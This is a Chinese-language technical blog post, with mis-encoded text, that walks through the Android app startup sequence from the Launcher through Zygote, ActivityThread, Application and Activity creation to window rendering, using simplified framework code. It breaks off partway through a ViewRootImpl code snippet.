            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4283353029151694/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å¿ƒæºxinyuan
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-04T01:08:33.000Z" title="Wed Feb 04 2026 01:08:33 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-04
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    1
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»9åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">Android App å¯åŠ¨æµç¨‹è¯¦è§£</h2>
<p>Android åº”ç”¨å¯åŠ¨æ˜¯ä¸€ä¸ªå¤æ‚çš„è¿‡ç¨‹ï¼Œæ¶‰åŠå¤šä¸ªç³»ç»Ÿå’Œåº”ç”¨ç»„ä»¶ã€‚ä»¥ä¸‹æ˜¯è¯¦ç»†çš„å¯åŠ¨æµç¨‹åˆ†æï¼š</p>
<h3 data-id="heading-1">ä¸€ã€ç‚¹å‡»å›¾æ ‡åˆ°è¿›ç¨‹åˆ›å»º</h3>
<h4 data-id="heading-2"><strong>1. Launcher ç‚¹å‡»å¯åŠ¨</strong></h4>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// Launcher æºç ç®€åŒ–æµç¨‹</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">LauncherActivity</span> <span class="hljs-title">extends</span> <span class="hljs-title">Activity</span> {
    void onClick(AppIcon icon) {
        <span class="hljs-comment">// åˆ›å»ºå¯åŠ¨Intent</span>
        Intent intent = new Intent(Intent.ACTION_MAIN);
        intent.addCategory(Intent.CATEGORY_LAUNCHER);
        intent.setComponent(new ComponentName(packageName, activityName));
        intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        
        <span class="hljs-comment">// é€šè¿‡ActivityManagerServiceå¯åŠ¨</span>
        ActivityManager.getService().startActivity(...);
    }
}
</code></pre>
<h4 data-id="heading-3"><strong>2. ç³»ç»ŸæœåŠ¡å¤„ç†æµç¨‹</strong></h4>
<pre><code class="hljs language-scss" lang="scss">ç”¨æˆ·ç‚¹å‡»å›¾æ ‡ 
    â†“
Launcherè¿›ç¨‹è°ƒç”¨<span class="hljs-built_in">startActivity</span>()
    â†“
é€šè¿‡Binder IPCè°ƒç”¨ActivityManagerService
    â†“
AMSæ£€æŸ¥æƒé™ã€è¿›ç¨‹çŠ¶æ€ç­‰
    â†“
å¦‚æœåº”ç”¨è¿›ç¨‹ä¸å­˜åœ¨ï¼Œåˆ›å»ºæ–°è¿›ç¨‹
    â†“
é€šè¿‡Zygoteè¿›ç¨‹forkæ–°è¿›ç¨‹
    â†“
æ–°è¿›ç¨‹è°ƒç”¨ActivityThread<span class="hljs-selector-class">.main</span>()
</code></pre>
<h3 data-id="heading-4">äºŒã€Zygote è¿›ç¨‹åˆ›å»º</h3>
<h4 data-id="heading-5"><strong>1. Zygote æœºåˆ¶</strong></h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// Zygoteè¿›ç¨‹åˆ›å»ºåº”ç”¨è¿›ç¨‹</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">ZygoteProcess</span> {
    <span class="hljs-comment">// forkæ–°è¿›ç¨‹</span>
    Process.ProcessStartResult <span class="hljs-title function_">startViaZygote</span><span class="hljs-params">(...)</span> {
        <span class="hljs-comment">// å‡†å¤‡å‚æ•°</span>
        ArrayList&lt;String&gt; args = computeArgsForZygote(...);
        
        <span class="hljs-comment">// è°ƒç”¨Zygoteè¿›ç¨‹fork</span>
        <span class="hljs-keyword">return</span> zygoteSendArgsAndGetResult(openZygoteSocketIfNeeded(), args);
    }
}

<span class="hljs-comment">// ZygoteServerå¤„ç†forkè¯·æ±‚</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">ZygoteServer</span> {
    Runnable <span class="hljs-title function_">forkAndSpecialize</span><span class="hljs-params">(...)</span> {
        <span class="hljs-comment">// forkå­è¿›ç¨‹</span>
        pid = Zygote.forkAndSpecialize(...);
        
        <span class="hljs-keyword">if</span> (pid == <span class="hljs-number">0</span>) {
            <span class="hljs-comment">// å­è¿›ç¨‹ï¼šè®¾ç½®ç¯å¢ƒå¹¶è¿”å›</span>
            handleChildProc(parsedArgs, descriptors, childPipeFd);
        } <span class="hljs-keyword">else</span> {
            <span class="hljs-comment">// çˆ¶è¿›ç¨‹ï¼šç­‰å¾…å­è¿›ç¨‹</span>
            handleParentProc(pid, descriptors, serverPipeFd);
        }
    }
}
</code></pre>
<h4 data-id="heading-6"><strong>2. åº”ç”¨è¿›ç¨‹åˆ›å»ºåçš„åˆå§‹åŒ–</strong></h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// åº”ç”¨è¿›ç¨‹å…¥å£ç‚¹</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ActivityThread</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        <span class="hljs-comment">// 1. å‡†å¤‡ä¸»çº¿ç¨‹Looper</span>
        Looper.prepareMainLooper();
        
        <span class="hljs-comment">// 2. åˆ›å»ºActivityThreadå®ä¾‹</span>
        <span class="hljs-type">ActivityThread</span> <span class="hljs-variable">thread</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ActivityThread</span>();
        
        <span class="hljs-comment">// 3. ç»‘å®šåˆ°AMS</span>
        thread.attach(<span class="hljs-literal">false</span>, startSeq);
        
        <span class="hljs-comment">// 4. è·å–ä¸»çº¿ç¨‹Handler</span>
        <span class="hljs-keyword">if</span> (sMainThreadHandler == <span class="hljs-literal">null</span>) {
            sMainThreadHandler = thread.getHandler();
        }
        
        <span class="hljs-comment">// 5. å¼€å§‹æ¶ˆæ¯å¾ªç¯</span>
        Looper.loop();
    }
    
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">attach</span><span class="hljs-params">(<span class="hljs-type">boolean</span> system, <span class="hljs-type">long</span> startSeq)</span> {
        <span class="hljs-comment">// è·å–AMSä»£ç†</span>
        <span class="hljs-keyword">final</span> <span class="hljs-type">IActivityManager</span> <span class="hljs-variable">mgr</span> <span class="hljs-operator">=</span> ActivityManager.getService();
        
        <span class="hljs-keyword">try</span> {
            <span class="hljs-comment">// ç»‘å®šåº”ç”¨è¿›ç¨‹åˆ°AMS</span>
            mgr.attachApplication(mAppThread, startSeq);
        } <span class="hljs-keyword">catch</span> (RemoteException ex) {
            <span class="hljs-keyword">throw</span> ex.rethrowFromSystemServer();
        }
    }
}
</code></pre>
<h3 data-id="heading-7">ä¸‰ã€Application åˆ›å»ºå’Œåˆå§‹åŒ–</h3>
<h4 data-id="heading-8"><strong>1. Application åˆ›å»ºæµç¨‹</strong></h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">class</span> <span class="hljs-title class_">ActivityThread</span> {
    <span class="hljs-comment">// å¤„ç†ç»‘å®šåº”ç”¨</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">handleBindApplication</span><span class="hljs-params">(AppBindData data)</span> {
        <span class="hljs-comment">// 1. è®¾ç½®è¿›ç¨‹å</span>
        Process.setArgV0(data.processName);
        
        <span class="hljs-comment">// 2. åˆ›å»ºContextImpl</span>
        <span class="hljs-type">ContextImpl</span> <span class="hljs-variable">appContext</span> <span class="hljs-operator">=</span> ContextImpl.createAppContext(<span class="hljs-built_in">this</span>, data.info);
        
        <span class="hljs-comment">// 3. åˆ›å»ºInstrumentation</span>
        mInstrumentation = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Instrumentation</span>();
        
        <span class="hljs-comment">// 4. åˆ›å»ºApplication</span>
        <span class="hljs-type">Application</span> <span class="hljs-variable">app</span> <span class="hljs-operator">=</span> data.info.makeApplication(data.restrictedBackupMode, <span class="hljs-literal">null</span>);
        
        <span class="hljs-comment">// 5. è®¾ç½®Applicationçš„Context</span>
        app.setBaseContext(appContext);
        
        <span class="hljs-comment">// 6. è°ƒç”¨Application.onCreate()</span>
        mInstrumentation.callApplicationOnCreate(app);
    }
}

<span class="hljs-comment">// LoadedApkè´Ÿè´£åˆ›å»ºApplicationå®ä¾‹</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">LoadedApk</span> {
    <span class="hljs-keyword">public</span> Application <span class="hljs-title function_">makeApplication</span><span class="hljs-params">(<span class="hljs-type">boolean</span> forceDefaultAppClass, 
                                      Instrumentation instrumentation)</span> {
        <span class="hljs-comment">// å¦‚æœApplicationå·²ç»å­˜åœ¨ï¼Œç›´æ¥è¿”å›</span>
        <span class="hljs-keyword">if</span> (mApplication != <span class="hljs-literal">null</span>) {
            <span class="hljs-keyword">return</span> mApplication;
        }
        
        <span class="hljs-comment">// è·å–Applicationç±»å</span>
        <span class="hljs-type">String</span> <span class="hljs-variable">appClass</span> <span class="hljs-operator">=</span> mApplicationInfo.className;
        <span class="hljs-keyword">if</span> (forceDefaultAppClass || appClass == <span class="hljs-literal">null</span>) {
            appClass = <span class="hljs-string">"android.app.Application"</span>;
        }
        
        <span class="hljs-keyword">try</span> {
            <span class="hljs-comment">// 1. åˆ›å»ºClassLoader</span>
            <span class="hljs-type">ClassLoader</span> <span class="hljs-variable">cl</span> <span class="hljs-operator">=</span> getClassLoader();
            
            <span class="hljs-comment">// 2. åˆ›å»ºApplication Context</span>
            <span class="hljs-type">ContextImpl</span> <span class="hljs-variable">appContext</span> <span class="hljs-operator">=</span> ContextImpl.createAppContext(mActivityThread, <span class="hljs-built_in">this</span>);
            
            <span class="hljs-comment">// 3. å®ä¾‹åŒ–Application</span>
            <span class="hljs-type">Application</span> <span class="hljs-variable">app</span> <span class="hljs-operator">=</span> mActivityThread.mInstrumentation
                .newApplication(cl, appClass, appContext);
            
            <span class="hljs-comment">// 4. è®¾ç½®åˆ°Context</span>
            appContext.setOuterContext(app);
            
            <span class="hljs-comment">// 5. æ·»åŠ åˆ°ActivityThread</span>
            mActivityThread.mAllApplications.add(app);
            mApplication = app;
            
            <span class="hljs-keyword">return</span> app;
        } <span class="hljs-keyword">catch</span> (Exception e) {
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(...);
        }
    }
}
</code></pre>
<h4 data-id="heading-9"><strong>2. Application.onCreate() è°ƒç”¨æ—¶æœº</strong></h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// Instrumentation è°ƒç”¨ Application.onCreate()</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Instrumentation</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">callApplicationOnCreate</span><span class="hljs-params">(Application app)</span> {
        <span class="hljs-comment">// è¿™å°±æ˜¯æˆ‘ä»¬é‡å†™çš„onCreate()è¢«è°ƒç”¨çš„åœ°æ–¹</span>
        app.onCreate();
    }
}
</code></pre>
<h3 data-id="heading-10">å››ã€Activity å¯åŠ¨æµç¨‹</h3>
<h4 data-id="heading-11"><strong>1. AMS è°ƒåº¦ Activity å¯åŠ¨</strong></h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// ActivityManagerService è°ƒåº¦Activityå¯åŠ¨</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">ActivityManagerService</span> {
    <span class="hljs-comment">// å¯åŠ¨Activityçš„æœ€ç»ˆå…¥å£</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-title function_">startActivity</span><span class="hljs-params">(...)</span> {
        <span class="hljs-keyword">return</span> startActivityAsUser(...);
    }
    
    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> <span class="hljs-title function_">startActivityAsUser</span><span class="hljs-params">(...)</span> {
        <span class="hljs-comment">// 1. æƒé™æ£€æŸ¥</span>
        enforceNotIsolatedCaller(<span class="hljs-string">"startActivity"</span>);
        
        <span class="hljs-comment">// 2. è°ƒç”¨ActivityStarter</span>
        <span class="hljs-keyword">return</span> mActivityStartController.obtainStarter(...)
            .setCaller(caller)
            .setIntent(intent)
            .setResolvedType(resolvedType)
            .execute();
    }
}

<span class="hljs-comment">// ActivityStarter å®é™…æ‰§è¡Œå¯åŠ¨</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">ActivityStarter</span> {
    <span class="hljs-type">int</span> <span class="hljs-title function_">execute</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">try</span> {
            <span class="hljs-comment">// è§£æIntent</span>
            <span class="hljs-type">ResolveInfo</span> <span class="hljs-variable">rInfo</span> <span class="hljs-operator">=</span> mSupervisor.resolveIntent(...);
            
            <span class="hljs-comment">// æ”¶é›†ä¿¡æ¯</span>
            <span class="hljs-type">ActivityInfo</span> <span class="hljs-variable">aInfo</span> <span class="hljs-operator">=</span> mSupervisor.resolveActivity(...);
            
            <span class="hljs-comment">// å¯åŠ¨Activity</span>
            <span class="hljs-keyword">return</span> startActivityUnchecked(...);
        } <span class="hljs-keyword">finally</span> {
            <span class="hljs-comment">// æ¸…ç†</span>
            onExecutionComplete();
        }
    }
}
</code></pre>
<h4 data-id="heading-12"><strong>2. åº”ç”¨è¿›ç¨‹æ¥æ”¶å¯åŠ¨è¯·æ±‚</strong></h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">class</span> <span class="hljs-title class_">ActivityThread</span> {
    <span class="hljs-comment">// å¤„ç†å¯åŠ¨Activityçš„è¯·æ±‚</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">H</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Handler</span> {
        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">handleMessage</span><span class="hljs-params">(Message msg)</span> {
            <span class="hljs-keyword">switch</span> (msg.what) {
                <span class="hljs-keyword">case</span> LAUNCH_ACTIVITY:
                    handleLaunchActivity((ActivityClientRecord) msg.obj, <span class="hljs-string">"LAUNCH_ACTIVITY"</span>);
                    <span class="hljs-keyword">break</span>;
                <span class="hljs-keyword">case</span> RESUME_ACTIVITY:
                    handleResumeActivity(...);
                    <span class="hljs-keyword">break</span>;
            }
        }
    }
    
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">handleLaunchActivity</span><span class="hljs-params">(ActivityClientRecord r, String reason)</span> {
        <span class="hljs-comment">// 1. åˆ›å»ºActivity</span>
        <span class="hljs-type">Activity</span> <span class="hljs-variable">a</span> <span class="hljs-operator">=</span> performLaunchActivity(r, <span class="hljs-literal">null</span>);
        
        <span class="hljs-keyword">if</span> (a != <span class="hljs-literal">null</span>) {
            <span class="hljs-comment">// 2. è°ƒç”¨onStart(), onResume()</span>
            handleResumeActivity(r.token, <span class="hljs-literal">false</span>, r.isForward, reason);
        }
    }
}
</code></pre>
<h4 data-id="heading-13"><strong>3. Activity å®ä¾‹åˆ›å»ºå’Œç”Ÿå‘½å‘¨æœŸ</strong></h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">class</span> <span class="hljs-title class_">ActivityThread</span> {
    <span class="hljs-keyword">private</span> Activity <span class="hljs-title function_">performLaunchActivity</span><span class="hljs-params">(ActivityClientRecord r, Intent customIntent)</span> {
        <span class="hljs-comment">// 1. è·å–ActivityInfo</span>
        <span class="hljs-type">ActivityInfo</span> <span class="hljs-variable">aInfo</span> <span class="hljs-operator">=</span> r.activityInfo;
        
        <span class="hljs-comment">// 2. åˆ›å»ºContext</span>
        <span class="hljs-type">ContextImpl</span> <span class="hljs-variable">appContext</span> <span class="hljs-operator">=</span> createBaseContextForActivity(r);
        
        <span class="hljs-comment">// 3. åˆ›å»ºActivityå®ä¾‹</span>
        <span class="hljs-type">Activity</span> <span class="hljs-variable">activity</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;
        <span class="hljs-keyword">try</span> {
            java.lang.<span class="hljs-type">ClassLoader</span> <span class="hljs-variable">cl</span> <span class="hljs-operator">=</span> appContext.getClassLoader();
            activity = mInstrumentation.newActivity(
                cl, component.getClassName(), r.intent);
        } <span class="hljs-keyword">catch</span> (Exception e) {
            <span class="hljs-comment">// å¤„ç†å¼‚å¸¸</span>
        }
        
        <span class="hljs-comment">// 4. åˆ›å»ºApplicationï¼ˆå¦‚æœè¿˜æ²¡åˆ›å»ºï¼‰</span>
        <span class="hljs-type">Application</span> <span class="hljs-variable">app</span> <span class="hljs-operator">=</span> r.packageInfo.makeApplication(<span class="hljs-literal">false</span>, mInstrumentation);
        
        <span class="hljs-comment">// 5. è°ƒç”¨Activity.attach()</span>
        activity.attach(appContext, <span class="hljs-built_in">this</span>, getInstrumentation(), r.token,
            r.ident, app, r.intent, r.activityInfo, ...);
        
        <span class="hljs-comment">// 6. è®¾ç½®ä¸»é¢˜</span>
        <span class="hljs-type">int</span> <span class="hljs-variable">theme</span> <span class="hljs-operator">=</span> r.activityInfo.getThemeResource();
        <span class="hljs-keyword">if</span> (theme != <span class="hljs-number">0</span>) {
            activity.setTheme(theme);
        }
        
        <span class="hljs-comment">// 7. è°ƒç”¨Activity.onCreate()</span>
        <span class="hljs-keyword">if</span> (r.isPersistable()) {
            mInstrumentation.callActivityOnCreate(activity, r.state, r.persistentState);
        } <span class="hljs-keyword">else</span> {
            mInstrumentation.callActivityOnCreate(activity, r.state);
        }
        
        <span class="hljs-keyword">return</span> activity;
    }
}

<span class="hljs-comment">// Instrumentation è°ƒç”¨ç”Ÿå‘½å‘¨æœŸæ–¹æ³•</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Instrumentation</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">callActivityOnCreate</span><span class="hljs-params">(Activity activity, Bundle icicle)</span> {
        <span class="hljs-comment">// é¢„åˆ›å»º</span>
        prePerformCreate(activity);
        
        <span class="hljs-comment">// è°ƒç”¨Activity.onCreate()</span>
        activity.performCreate(icicle);
        
        <span class="hljs-comment">// ååˆ›å»º</span>
        postPerformCreate(activity);
    }
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">callActivityOnStart</span><span class="hljs-params">(Activity activity)</span> {
        activity.performStart();
    }
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">callActivityOnResume</span><span class="hljs-params">(Activity activity)</span> {
        activity.performResume();
    }
}
</code></pre>
<h3 data-id="heading-14">äº”ã€ç•Œé¢æ¸²æŸ“æµç¨‹</h3>
<h4 data-id="heading-15"><strong>1. Window å’Œ View åˆ›å»º</strong></h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// Activity.attach() ä¸­åˆ›å»ºWindow</span>
<span class="hljs-keyword">final</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">attach</span><span class="hljs-params">(Context context, ...)</span> {
    <span class="hljs-comment">// 1. åˆ›å»ºWindow</span>
    mWindow = <span class="hljs-keyword">new</span> <span class="hljs-title class_">PhoneWindow</span>(<span class="hljs-built_in">this</span>, window, activityConfigCallback);
    
    <span class="hljs-comment">// 2. è®¾ç½®WindowManager</span>
    mWindow.setWindowManager(
        (WindowManager)context.getSystemService(Context.WINDOW_SERVICE),
        mToken, mComponent.flattenToString(),
        (info.flags &amp; ActivityInfo.FLAG_HARDWARE_ACCELERATED) != <span class="hljs-number">0</span>);
    
    <span class="hljs-comment">// 3. è·å–WindowManager</span>
    mWindowManager = mWindow.getWindowManager();
}

<span class="hljs-comment">// Activity.onCreate() ä¸­è®¾ç½®ContentView</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onCreate</span><span class="hljs-params">(Bundle savedInstanceState)</span> {
    <span class="hljs-built_in">super</span>.onCreate(savedInstanceState);
    
    <span class="hljs-comment">// 1. åˆ›å»ºDecorView</span>
    mWindow.getDecorView();
    
    <span class="hljs-comment">// 2. è®¾ç½®å†…å®¹è§†å›¾</span>
    setContentView(R.layout.activity_main);
    
    <span class="hljs-comment">// 3. åˆå§‹åŒ–View</span>
    initViews();
}

<span class="hljs-comment">// setContentView() å®ç°</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setContentView</span><span class="hljs-params">(<span class="hljs-meta">@LayoutRes</span> <span class="hljs-type">int</span> layoutResID)</span> {
    <span class="hljs-comment">// 1. è·å–Window</span>
    getWindow().setContentView(layoutResID);
    
    <span class="hljs-comment">// 2. åˆå§‹åŒ–ActionBar</span>
    initWindowDecorActionBar();
}

<span class="hljs-comment">// PhoneWindow.setContentView()</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setContentView</span><span class="hljs-params">(<span class="hljs-type">int</span> layoutResID)</span> {
    <span class="hljs-comment">// 1. å¦‚æœDecorViewä¸å­˜åœ¨ï¼Œåˆ›å»ºå®ƒ</span>
    <span class="hljs-keyword">if</span> (mContentParent == <span class="hljs-literal">null</span>) {
        installDecor();
    }
    
    <span class="hljs-comment">// 2. åŠ è½½å¸ƒå±€</span>
    mLayoutInflater.inflate(layoutResID, mContentParent);
}
</code></pre>
<h4 data-id="heading-16"><strong>2. ViewRootImpl å’Œç•Œé¢æ¸²æŸ“</strong></h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// ActivityThread.handleResumeActivity()</span>
<span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">handleResumeActivity</span><span class="hljs-params">(IBinder token, ...)</span> {
    <span class="hljs-comment">// 1. è°ƒç”¨Activity.onResume()</span>
    <span class="hljs-keyword">final</span> <span class="hljs-type">Activity</span> <span class="hljs-variable">a</span> <span class="hljs-operator">=</span> r.activity;
    a.performResume();
    
    <span class="hljs-comment">// 2. è·å–DecorView</span>
    <span class="hljs-type">View</span> <span class="hljs-variable">decor</span> <span class="hljs-operator">=</span> r.window.getDecorView();
    
    <span class="hljs-comment">// 3. è®¾ç½®DecorViewä¸ºä¸å¯è§</span>
    decor.setVisibility(View.INVISIBLE);
    
    <span class="hljs-comment">// 4. è·å–ViewManagerï¼ˆWindowManagerï¼‰</span>
    <span class="hljs-type">ViewManager</span> <span class="hljs-variable">wm</span> <span class="hljs-operator">=</span> a.getWindowManager();
    
    <span class="hljs-comment">// 5. æ·»åŠ DecorViewåˆ°Window</span>
    wm.addView(decor, l);
    
    <span class="hljs-comment">// 6. è®¾ç½®DecorViewä¸ºå¯è§</span>
    decor.setVisibility(View.VISIBLE);
    
    <span class="hljs-comment">// 7. ç„¦ç‚¹å¤„ç†</span>
    a.makeVisible();
}

<span class="hljs-comment">// WindowManagerImpl.addView()</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">addView</span><span class="hljs-params">(<span class="hljs-meta">@NonNull</span> View view, <span class="hljs-meta">@NonNull</span> ViewGroup.LayoutParams params)</span> {
    <span class="hljs-comment">// åˆ›å»ºViewRootImpl</span>
    <span class="hljs-type">ViewRootImpl</span> <span class="hljs-variable">root</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ViewRootImpl</span>(view.getContext(), display);
    
    <span class="hljs-comment">// è®¾ç½®View</span>
    view.setLayoutParams(wparams);
    
    <span class="hljs-comment">// æ·»åŠ åˆ°åˆ—è¡¨</span>
    mViews.add(view);
    mRoots.add(root);
    mParams.add(wparams);
    
    <span class="hljs-comment">// è®¾ç½®ViewRootImpl</span>
    root.setView(view, wparams, panelParentView);
}
</code></pre>
<h4 data-id="heading-17"><strong>3. ç•Œé¢ç»˜åˆ¶æµç¨‹</strong></h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// ViewRootImpl.setView()</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setView</span><span class="hljs-params">(View view, WindowManager.LayoutParams attrs, View panelParentView)</span> {
    <span class="hljs-keyword">synchronized</span> (<span class="hljs-built_in">this</span>) {
        <span class="hljs-keyword">if</span> (mView == <span class="hljs-literal">null</span>) {
            mView = view;
            
            <span class="hljs-comment">// 1. è¯·æ±‚å¸ƒå±€</span>
            requestLayout();
            
            <span class="hljs-comment">// 2. åˆ›å»ºInputChannel</span>
            mInputChannel = <span class="hljs-keyword">new</span> <span class="hljs-title class_">InputChannel</span>();
            
